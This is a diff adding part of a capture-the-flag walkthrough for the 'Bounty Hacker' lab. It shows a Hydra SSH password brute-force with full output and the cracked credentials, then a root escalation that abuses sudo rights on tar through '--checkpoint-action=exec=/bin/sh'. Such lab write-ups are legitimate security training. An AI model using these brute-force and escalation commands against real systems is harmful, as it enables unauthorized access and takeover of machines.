@@ -83,4 +83,64 @@ R3Dr4gOn2044
 ....                                                                                                                                                                             
 [9:41] root@prime ~/ctf/bounty-hacker # 
 ```
+now this time to brute force 
 
+```
+[9:43] root@prime ~/ctf/bounty-hacker # hydra -l lin -P locks.txt ssh://10.49.144.83 -V -t 4
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-12 09:45:43
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.49.144.83:22/
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 2] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 3] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 1] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 0] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 2] (0/0)
+[ATTEMPT] target 10.49.144.83 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 3] (0/0)
+[22][ssh] host: 10.49.144.83   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-12 09:45:54
+                                                                                                                                                                                             
+[9:45] root@prime ~/ctf/bounty-hacker #
+```
+
+we found a valid password so now this  time to login using ssh credentials 
+
+and now time to privESC
+```
+lin@ip-10-49-144-83:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-49-144-83:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on ip-10-49-144-83:
+    (root) /bin/tar
+lin@ip-10-49-144-83:~/Desktop$ ls -l /bin/tar
+-rwsr-xr-x 1 root root 448112 Dec  4  2023 /bin/tar
+lin@ip-10-49-144-83:~/Desktop$ /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+/bin/tar: Removing leading `/' from member names
+$ id
+uid=1001(lin) gid=1001(lin) groups=1001(lin)
+$ echo '/bin/sh 0<&1' >/path/to/temp-file
+tar cf /path/to/temp-file.tar /path/to/temp-file
+tar xf /path/to/temp-file.tar --to-command /bin/sh/bin/sh: 2: cannot create /path/to/temp-file: Directory nonexistent
+$ tar: /path/to/temp-file.tar: Cannot open: No such file or directory
+tar: Error is not recoverable: exiting now
+fi     
+tar: /path/to/temp-file.tar: Cannot open: No such file or directory
+tar: Error is not recoverable: exiting now
+$ id
+uid=1001(lin) gid=1001(lin) groups=1001(lin)
+$ sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+/bin/tar: Removing leading `/' from member names
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+THM{80UN7Y_h4cK3r}
+# 
+```
